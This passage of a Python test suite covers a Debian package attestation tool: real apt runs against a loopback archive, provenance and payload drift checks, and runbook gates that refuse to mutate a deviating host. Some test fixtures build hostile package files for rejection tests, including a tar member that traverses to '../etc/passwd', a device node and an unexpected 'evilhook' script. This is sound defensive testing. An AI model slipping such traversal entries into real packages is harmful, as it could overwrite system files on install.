    class Recording(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args, **kwargs) -> None:
            pass

        def do_GET(self) -> None:
            requested.append(self.path)
            super().do_GET()
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), functools.partial(Recording, directory=str(work)))
    threading.Thread(target=server.serve_forever, daemon=True).start()
    archive = LoopbackArchive(work, keyring, f"http://127.0.0.1:{server.server_port}", debs)
    archive.requested = requested
    try:
        yield archive
    finally:
        server.shutdown()
        server.server_close()


def isolated_apt(tmp_path: Path, archive: LoopbackArchive, name: str, variants: str, arch_filter: str = "") -> tuple[Path, Path]:
    """An isolated apt state for the loopback archive, refreshed with the real ``apt-get update``. ``arch_filter`` is the source's own ``arch=`` option, spelled exactly as an operator would write it, or empty for none."""
    apt = tmp_path / name
    apt.mkdir(mode=0o700)
    apt.chmod(0o700)
    for sub in ("state/lists/partial", "cache/archives/partial", "etc/sources.list.d", "scratch"):
        (apt / sub).mkdir(parents=True)
    (apt / "status").write_text("")
    options = f"signed-by={archive.keyring}" + (f" arch={arch_filter}" if arch_filter else "")
    (apt / "etc/sources.list").write_text(f"deb [{options}] {archive.url} test main\n")
    config = apt / "apt.conf"
    config.write_text(
        f'Dir::Etc::sourcelist "{apt}/etc/sources.list";\nDir::Etc::sourceparts "{apt}/etc/sources.list.d";\nDir::State "{apt}/state";\n'
        f'Dir::State::status "{apt}/status";\nDir::Cache "{apt}/cache";\nAPT::Architecture "amd64";\nAPT::Architectures "amd64";\nAPT::Architecture-Variants "{variants}";\n'
        'Acquire::http::Proxy "DIRECT";\n')
    config.chmod(0o600)
    updated = subprocess.run(["/usr/bin/apt-get", "update", "-c", str(config)], capture_output=True, text=True, env={"PATH": "/usr/bin:/bin", "LC_ALL": "C", "TMPDIR": str(apt / "scratch")}, stdin=subprocess.DEVNULL, timeout=120)      # apt's gpgv method writes temporary files
    assert updated.returncode == 0, updated.stdout + updated.stderr
    return apt, config


def raw_apt_stanza(apt: Path, config: Path) -> str:
    """What apt itself shows for the package under that configuration, bypassing the tool (and so its refusals)."""
    done = subprocess.run(["/usr/bin/apt-cache", "show", "route3-e2e=1.0", "-c", str(config)], capture_output=True, text=True, env={"PATH": "/usr/bin:/bin", "LC_ALL": "C", "TMPDIR": str(apt / "scratch")}, stdin=subprocess.DEVNULL, timeout=60)
    assert done.returncode == 0, done.stdout + done.stderr
    return done.stdout


def test_the_real_apt_reads_only_the_isolated_archive_and_leaves_the_system_configuration_alone(tmp_path, loopback_archive):
    """Real ``apt-cache``/``apt-get`` against a loopback repository: the isolated configuration, and nothing else, reaches the package."""
    debs, url = loopback_archive.debs, loopback_archive.url
    system_lists = sorted(p.name for p in Path("/var/lib/apt/lists").glob("*")) if Path("/var/lib/apt/lists").is_dir() else []
    apt, config = isolated_apt(tmp_path, loopback_archive, "apt", "")
    archive = rr.Archive(apt_config=config)
    stated, origins = archive.index("route3-e2e", "1.0", "amd64", apt / "scratch")
    assert stated == debs["plain"] and origins == (f"{url} test/main",), "the configuration that names no variant selects the plain build"
    fetched = archive.fetch("route3-e2e", "1.0", apt / "scratch")
    assert rr.sha256_file(fetched) == debs["plain"]
    assert not any("Architecture-Variant" in row for row in rr.deb_rows(rr.parse_deb(fetched.read_bytes()))[0])

    # the same repository, a configuration that selects the variant the baseline host runs and no source arch filter: the variant build is indexed, downloaded and bound with its label
    v3_apt, v3_config = isolated_apt(tmp_path, loopback_archive, "apt-v3", "amd64v3")
    v3_archive = rr.Archive(apt_config=v3_config)
    stated, origins = v3_archive.index("route3-e2e", "1.0", "amd64", v3_apt / "scratch")
    assert stated == debs["amd64v3"] != debs["plain"] and origins == (f"{url} test/main",)
    v3_fetched = v3_archive.fetch("route3-e2e", "1.0", v3_apt / "scratch")
    assert v3_fetched.name.endswith("_amd64v3.deb") and rr.sha256_file(v3_fetched) == debs["amd64v3"]
    v3_rows = rr.deb_rows(rr.parse_deb(v3_fetched.read_bytes()))
    assert "f\tArchitecture-Variant\tamd64v3" in v3_rows[0] and v3_rows != rr.deb_rows(rr.parse_deb(fetched.read_bytes()))

    with pytest.raises(rr.RecordError, match="shows nothing for route3-e2e=1.0 .*--apt-config"):
        rr.Archive().index("route3-e2e", "1.0", "amd64", tmp_path)
    (apt / "etc/sources.list").write_text(f"deb [trusted=yes] {url} test main\n")
    with pytest.raises(rr.RecordError, match=r"signed-index trust anchor.*trusted=yes"):
        rr.Archive(apt_config=config)
    assert sorted(p.name for p in Path("/var/lib/apt/lists").glob("*")) == system_lists if Path("/var/lib/apt/lists").is_dir() else True


def test_a_source_arch_filter_makes_real_apt_select_the_plain_build_even_with_architecture_variants_set(tmp_path, loopback_archive):
    """The 2026-11-14 ``oracle-test`` finding, modelled with Ubuntu's layout (plain and variant builds in separate ``binary-amd64`` / ``binary-amd64v3`` indexes): ``APT::Architecture-Variants "amd64v3"`` with a source
    written ``[arch=amd64 ...]`` never fetches ``binary-amd64v3/Packages``, so apt shows and downloads the plain build, whose interpreter bytes are not the installed variant's. Only a source without the filter selects the variant."""
    debs, requested = loopback_archive.debs, loopback_archive.requested
    seen = {}
    for name, variants, arch_filter, want in (("plain-unfiltered", "", "", "plain"), ("plain-filtered", "", "amd64", "plain"), ("wrong-filtered", "amd64v3", "amd64", "plain"), ("right-unfiltered", "amd64v3", "", "amd64v3")):
        requested.clear()
        apt, config = isolated_apt(tmp_path, loopback_archive, name, variants, arch_filter)
        fetched_indexes = {p.rsplit("/", 2)[-2] for p in requested if p.endswith("/Packages") or "/Packages." in p}
        shown = raw_apt_stanza(apt, config)
        assert f"SHA256: {debs[want]}" in shown and f"SHA256: {debs['amd64v3' if want == 'plain' else 'plain']}" not in shown, (name, shown)
        assert ("Architecture-Variant: amd64v3" in shown) == (want == "amd64v3"), name
        seen[name] = fetched_indexes
    assert seen["plain-unfiltered"] == seen["plain-filtered"] == seen["wrong-filtered"] == {"binary-amd64"}, seen
    assert seen["right-unfiltered"] == {"binary-amd64v3"}, seen      # the variant's own index; apt does not fetch the plain one beside it
    # the tool refuses the filtered source before it asks apt anything; the corrected source is accepted and selects the variant
    with pytest.raises(rr.RecordError, match=r"cannot select the architecture variant it names: .*architecture filter \(arch=amd64\) while APT::Architecture-Variants is amd64v3"):
        rr.Archive(apt_config=tmp_path / "wrong-filtered/apt.conf")
    for harmless in ("plain-filtered", "plain-unfiltered"):
        assert rr.Archive(apt_config=tmp_path / harmless / "apt.conf").index("route3-e2e", "1.0", "amd64", tmp_path / harmless / "scratch")[0] == debs["plain"], "no variant configured: the filter is harmless"
    right_apt = tmp_path / "right-unfiltered"
    assert rr.Archive(apt_config=right_apt / "apt.conf").index("route3-e2e", "1.0", "amd64", right_apt / "scratch")[0] == debs["amd64v3"]


def test_the_reference_record_is_canonical_and_bound_to_its_baseline_record(host):
    record, text, reference = reviewed_reference(host)
    rendered = reference.render()
    assert rr.Reference.parse(rendered) == reference and rr.reference_findings(reference, record, text) == []
    rows = rendered.split("\n")
    for label, bad in (("order", "\n".join([rows[0], rows[1], rows[3], rows[2], *rows[4:]])), ("count", rendered.replace("\nend\t", "\nend\t9")), ("header", rendered.replace(rr.REFERENCE_HEADER, "x 1")),
                       ("digest case", rendered.replace(rows[2].split("\t")[4], rows[2].split("\t")[4].upper())), ("no newline", rendered.rstrip("\n")), ("empty", "")):
        with pytest.raises(rr.RecordError):
            rr.Reference.parse(bad)
    other_text = text.replace("resolute-updates", "resolute-security", 1)
    assert any("another baseline record" in f for f in rr.reference_findings(reference, record, other_text))
    missing = rr.Reference(reference.baseline_sha256, reference.members[1:])
    assert any("has no entry for" in f for f in rr.reference_findings(missing, record, text))
    extra = rr.Reference(reference.baseline_sha256, (*reference.members, rr.RefMember("libextra", "1", "amd64", "a" * 64, "b" * 64, "c" * 64, 1)))
    assert any("names libextra" in f for f in rr.reference_findings(extra, record, text))
    moved = rr.Reference(reference.baseline_sha256, (dataclasses.replace(reference.members[0], version="9"), *reference.members[1:]))
    assert any("describes" in f for f in rr.reference_findings(moved, record, text))


@pytest.mark.parametrize("label", ["not ar", "truncated", "two data members", "device in data", "path traversal", "unknown control member", "conffile without data", "oversize header"])
def test_a_hostile_or_malformed_package_file_is_a_finding_and_never_a_crash(host, label):
    spec = host.specs["libc6"]
    good = make_deb(spec)
    if label == "not ar":
        bad = b"not an archive"
    elif label == "truncated":
        bad = good[:-40]
    elif label == "two data members":
        bad = good + good[8:]
    elif label == "device in data":
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:") as tar:
            info = tarfile.TarInfo("./dev/null")
            info.type = tarfile.CHRTYPE
            tar.addfile(info)
        bad = make_deb_with_data(spec, buf.getvalue())
    elif label == "path traversal":
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:") as tar:
            info = tarfile.TarInfo("./../etc/passwd")
            info.size = 1
            tar.addfile(info, io.BytesIO(b"x"))
        bad = make_deb_with_data(spec, buf.getvalue())
    elif label == "unknown control member":
        bad = make_deb(dataclasses.replace(spec, scripts={**spec.scripts, "evilhook": "#!/bin/sh\n"}))
    elif label == "conffile without data":
        bad = make_deb(dataclasses.replace(spec, conffiles=("/etc/not-shipped.conf",)))
    else:
        bad = good[:68] + b"9999999999" + good[78:]
    with pytest.raises(rr.RecordError):
        rr.deb_identity(rr.parse_deb(bad))


def make_deb_with_data(spec: Spec, data_tar: bytes) -> bytes:
    good = make_deb(spec, "none")
    members, position = [], 8
    while position < len(good):
        header = good[position:position + 60]
        size = int(header[48:58])
        members.append((header[:16].decode().strip(), good[position + 60:position + 60 + size]))
        position += 60 + size + (size & 1)
    out = b"!<arch>\n"
    for name, body in members:
        body = data_tar if name.startswith("data.tar") else body
        out += f"{name:<16}{0:<12}{0:<6}{0:<6}{'100644':<8}{len(body):<10}`\n".encode() + body + (b"\n" if len(body) & 1 else b"")
    return out


def test_the_payload_rows_command_prints_the_same_rows_for_a_package_file_and_the_installed_package(host, tmp_path):
    deb = tmp_path / "libc6.deb"
    deb.write_bytes(make_deb(host.specs["libc6"]))
    from_deb = host.cli("payload-rows", "--package", "libc6", "--deb", str(deb), *host.flags())
    installed = host.cli("payload-rows", "--package", "libc6", *host.flags())
    assert from_deb.returncode == 0 and from_deb.stdout == installed.stdout and "file\tf\t/usr/lib/liblibc6.so\t0755" in installed.stdout
    assert "/etc/libc6.conf" not in "".join(l for l in installed.stdout.splitlines() if l.startswith("file")), "conffiles are not payload"
    assert "usr/lib64/ld-libc6.so" in installed.stdout, "the merged-/usr alias /lib64 resolves to /usr/lib64 on both sides"


# ---- provenance is compared exactly per member (finding 3) --------------------------------------------------------------------------------

def test_origins_are_compared_as_exact_per_member_sets(host):
    host.offer("libffi8", "3.5.2-1", SECURITY, append=True)
    record = rr.Baseline.parse(rr.attest(host.host()).render())
    assert next(m for m in record.members if m.name == "libffi8").origins == (MIRROR, SECURITY) and drift(host, record) == []
    # a reviewed source that no longer offers the member is drift ...
    host.offer("libffi8", "3.5.2-1", MIRROR)
    assert any("provenance drift: libffi8=3.5.2-1" in f and SECURITY in f for f in drift(host, record))
    # ... a source that was reviewed for ANOTHER member does not make this one acceptable ...
    host.offer("libffi8", "3.5.2-1", SECURITY)
    assert any("provenance drift: libffi8=3.5.2-1" in f and MIRROR in f for f in drift(host, record))
    # ... and an additional source is drift, even though the record's union already lists it
    host.offer("libffi8", "3.5.2-1", MIRROR, SECURITY)
    assert drift(host, record) == []
    host.offer("libc6", "2.43-2ubuntu1", MIRROR, SECURITY)
    assert any("provenance drift: libc6=2.43-2ubuntu1" in f for f in drift(host, record))


def test_a_member_without_a_reviewed_origin_or_without_a_live_origin_is_never_accepted(host):
    live = rr.attest(host.host())
    reviewed = rr.Baseline.parse(live.render())
    emptied = dataclasses.replace(live, members=tuple(dataclasses.replace(m, origins=()) if m.name == "libffi8" else m for m in live.members))
    assert any("provenance drift: libffi8" in f and "no archive source" in f for f in rr.compare(emptied, emptied)), "no origin on either side is not 'equal'"
    assert any("provenance drift: libffi8" in f for f in rr.compare(reviewed, emptied))
    assert any("provenance drift: libffi8" in f for f in rr.compare(emptied, live))
    with pytest.raises(rr.RecordError):
        rr.Baseline.parse(emptied.render()), "a record that names no origin for a member cannot even be parsed"


# ---- finding 2: every mutating block runs the whole trusted attestation itself, so skipping S0.3 skips nothing ---------------------------------

MUTATORS = ("apt-mark", "install", "useradd", "loginctl", "mv", "rm", "visudo", "chmod", "sync", "systemctl", "tee")

# block -> the checkpoint lines its own preconditions need before it reaches the gate
NEEDS = {"S1.0": [], "S1.1": ["s1-start"], "S1.2": ["s1-start", "done-C1"], "S1.3": ["s1-start", "done-C2"], "S1.4": ["s1-start", "done-C3"], "S3.1": ["s1-start", "done-C4"],
         "S3.2": ["s1-start", "done-C5"], "S3.3": ["s1-start", "done-C6"], "S3.5": ["s1-start", "done-C7"]}
GATED = sorted(NEEDS)


def direct_world(host: SyntheticHost, tmp_path: Path, ident: str):
    """The reviewed artifacts and a published (fake) evidence directory, with sentinel programs for every package, account, file and service mutation, so a block run DIRECTLY (S0.3 never run)
    shows exactly what it did before the gate refused it."""
    fields, art, rev_dir = s03_world(host, tmp_path)
    evid = tmp_path / "evid"
    if ident != "S1.0":                      # S1.0 creates the evidence; every later block needs the published pre-state
        evid.mkdir()
        for name in ("prestate.dpkg", "prestate.holds", "prestate.objects"):
            (evid / name).write_text("")
        (evid / "pre.sha256").write_text("".join(f"{rr.sha256_bytes(b'')}  {n}\n" for n in ("prestate.dpkg", "prestate.holds", "prestate.objects")))
        (evid / "checkpoints").write_text("".join(f"{line}\n" for line in NEEDS[ident]))
        evid.chmod(0o700)
    log = tmp_path / "mutations.log"
    for name in MUTATORS:
        (host.bin / name).write_text(f'#!/bin/sh\necho "{name} $*" >> "{log}"\nexit 0\n')
        (host.bin / name).chmod(0o755)
    return fields, art, evid, log


def run_direct(host, tmp_path, ident, fields, art, evid, mutate_host=None):
    def localize(text: str) -> str:
        text = text.replace("ROUTE3_EVID=/root/route3-evidence\n", f"ROUTE3_EVID={evid}\n").replace("ROUTE3_EVID_STAGE=/root/route3-evidence.new", f"ROUTE3_EVID_STAGE={evid}.new")
        text = text.replace('"$(stat -c %u:%a "$ROUTE3_EVID")" = 0:700', '"$(stat -c %u:%a "$ROUTE3_EVID")" = "$(id -u):700"')
        return text
    flags = " ".join(host.flags())
    body = next(b for b in runbook_blocks() if b.startswith(f"# {ident} — AUTHORITY"))
    defs = definitions(host, art)
    defs = localize(defs).replace("verify-host --record", f"verify-host {flags} --record")
    # the only seams: ownership (root), the lock scan of a machine this test does not own, and the deployed-tree walk (S1.2 has not run); the gate itself is the literal block D function
    defs += "\nroute3_apt_idle() { return 0; }\nroute3_tree_ok() { return 0; }\n"
    assigns = "".join(f'ROUTE3_{k}="{v}"\n' for k, v in fields.items())
    return subprocess.run(["/bin/bash", "-c", defs + "\n" + assigns + body.replace('stat -c %u "$d")" = 0 ]', 'stat -c %u "$d")" = "$(id -u)" ]') + "\n"], capture_output=True, text=True, check=False,
                          env={"PATH": "/usr/bin:/bin"})


def evidence_state(evid: Path):
    """Everything the block could have written to the evidence directory (None while S1.0 has not published it)."""
    return None if not evid.exists() else {p.name: p.read_bytes() for p in evid.iterdir()}


@pytest.mark.parametrize("ident", GATED)
def test_each_mutating_block_passes_the_gate_on_the_reviewed_host_and_goes_on_to_mutate(host, tmp_path, ident):
    """The positive control: nothing here is refused by the gate, so the refusals below are the gate's, not a harness artifact."""
    fields, art, evid, log = direct_world(host, tmp_path, ident)
    done = run_direct(host, tmp_path, ident, fields, art, evid)
    assert "trusted baseline attestation failed" not in done.stdout and "differs from its field digest" not in done.stdout, (ident, done.stdout, done.stderr)
    assert "ok: the host still is the reviewed baseline and every member's installed payload and metadata equal the signed-archive package" in done.stdout, (ident, done.stdout, done.stderr)


def deviate_missing_member(host):
    host.status({"libffi8": (None, "", "", "", "")})                    # a closure member is gone (its dependants no longer resolve)


def deviate_changed_member(host):
    host.status({"libffi8": ("3.5.3-1", "amd64", "libffi", "libc6", "")})
    host.offer("libffi8", "3.5.3-1", MIRROR)


def deviate_extra_member(host):
    host.status({"libffi8": ("3.5.2-1", "amd64", "libffi", "libc6, libnew1", ""), "libnew1": ("1", "amd64", "new", "", "")})
    host.offer("libnew1", "1", MIRROR)


def deviate_pinned_member_changed(host):
    host.status({"python3.14": ("3.14.4-1ubuntu0.3", "amd64", "python3.14", PACKAGES["python3.14"][3], "")})
    host.offer("python3.14", "3.14.4-1ubuntu0.3", MIRROR)


def deviate_extra_origin(host):
    host.offer("libffi8", "3.5.2-1", "http://ppa.example.test/ubuntu x/main", append=True)


def deviate_dropped_origin(host):
    host.offer("libffi8", "3.5.2-1", MIRROR)
    host.offer("python3.14", VERSION, MIRROR, SECURITY)               # one member offered by a source the record never reviewed


def deviate_interpreter(host):
    host.interpreter.write_bytes(b"another interpreter")


DEVIATIONS = {
    "closure member missing": deviate_missing_member, "closure member changed": deviate_changed_member, "closure member added": deviate_extra_member,
    "pinned member changed": deviate_pinned_member_changed, "extra origin": deviate_extra_origin, "origin set differs": deviate_dropped_origin, "interpreter replaced": deviate_interpreter,
    "payload: library replaced": mutate_library, "payload: setuid bit": mutate_setuid, "payload: file dropped from the list": mutate_file_dropped_from_list,
    "payload: extra listed file": mutate_extra_listed_file, "payload: symlink retargeted": mutate_symlink, "metadata: maintainer script": mutate_script,
    "metadata: control field": mutate_status_field, "metadata: conffile hides a library": mutate_conffile_hides_a_library, "dpkg path filter": mutate_path_filter,
}


QUICK = ["closure member missing", "closure member added", "pinned member changed", "extra origin", "payload: library replaced", "metadata: maintainer script"]
MATRIX = [(i, l) for i in GATED for l in QUICK] + [(i, l) for i in ("S1.0", "S3.1") for l in sorted(DEVIATIONS) if l not in QUICK]


@pytest.mark.parametrize("ident,label", MATRIX)
def test_a_block_invoked_directly_refuses_a_missing_changed_or_extra_closure_or_payload_before_it_mutates(host, tmp_path, ident, label):
    """Finding 2. S0.3 was never run: the block itself reruns the whole attestation from the digest-verified artifacts and, on any deviation, writes no checkpoint, calls no mutator and creates nothing."""
    fields, art, evid, log = direct_world(host, tmp_path, ident)
    before = evidence_state(evid)
    DEVIATIONS[label](host)
    done = run_direct(host, tmp_path, ident, fields, art, evid)
    assert done.returncode != 0 and "NO-GO" in done.stdout, (ident, label, done.stdout, done.stderr)
    assert not log.exists() or log.read_text() == "", f"a mutator ran before the refusal: {log.read_text() if log.exists() else ''}"
    assert evidence_state(evid) == before, "no checkpoint or evidence was written"
    assert not (tmp_path / "evid.new").exists()


@pytest.mark.parametrize("ident", GATED)
@pytest.mark.parametrize("label", ["code.tar replaced", "baseline.record replaced", "reference.record replaced", "reference.record removed", "artifact directory writable"])
def test_a_block_invoked_directly_refuses_untrusted_artifacts_before_it_mutates(host, tmp_path, ident, label):
    fields, art, evid, log = direct_world(host, tmp_path, ident)
    rev = art / fields["RELEASE_REV"]
    if label == "code.tar replaced":
        (rev / "code.tar").write_bytes(b"a tool the record does not name")
    elif label == "baseline.record replaced":
        (rev / "baseline.record").write_text((rev / "baseline.record").read_text() + " ")
    elif label == "reference.record replaced":
        (rev / "reference.record").write_text((rev / "reference.record").read_text() + " ")
    elif label == "reference.record removed":
        (rev / "reference.record").unlink()
    else:
        rev.chmod(0o775)
    done = run_direct(host, tmp_path, ident, fields, art, evid)
    assert done.returncode != 0 and "NO-GO" in done.stdout, (ident, label, done.stdout)
    assert not log.exists() or log.read_text() == ""
    assert not (tmp_path / "evid.new").exists() and not any(l.startswith("begin-") for l in ((evid / "checkpoints").read_text().splitlines() if evid.exists() else []))


@pytest.mark.parametrize("ident", ["S2.1", "S0.3"])
def test_the_read_only_verifications_also_run_the_whole_gate(host, tmp_path, ident):
    """S2.1 (read-only) and S0.3 refuse the same deviations; neither writes anything."""
    fields, art, evid, log = direct_world(host, tmp_path, "S1.1")
    mutate_library(host)
    done = run_direct(host, tmp_path, ident, fields, art, evid)
    assert done.returncode != 0 and "payload drift" in done.stdout and (not log.exists() or log.read_text() == ""), (ident, done.stdout, done.stderr)


def test_the_gate_text_is_the_single_attestation_and_runs_the_tool_from_the_verified_archive():
    defs = next(b for b in runbook_blocks() if b.startswith("ROUTE3_PATH="))
    gate = defs[defs.index("route3_gate() ("):]
    gate = gate[:gate.index("\n)") + 2]
    assert 'tar --extract --to-stdout --file "$A/code.tar" tools/route3_release_record.py' in gate and "verify-host --record" in gate and '--reference "$A/reference.record"' in gate
    assert "REFERENCE_SHA256=$ROUTE3_REFERENCE_SHA256" in gate and "$ROUTE3_BASELINE_SHA256" in gate and "$ROUTE3_ARCHIVE_SHA256" in gate
    assert gate.index("sha256sum --check") < gate.index("verify-host"), "the artifacts are digest-verified before the tool in them runs"
    assert gate.index('read -r h _ < <(sha256sum -- "$real")') < gate.index("verify-host"), "the interpreter is checked with sha256sum before it runs the tool"
    assert "route3_python_ok" in gate and "set -o pipefail" in gate
    for forbidden in ("apt-get", "apt-mark", "dpkg -i", " install ", "route3_cp", "tee ", ">>"):
        assert forbidden not in gate, forbidden
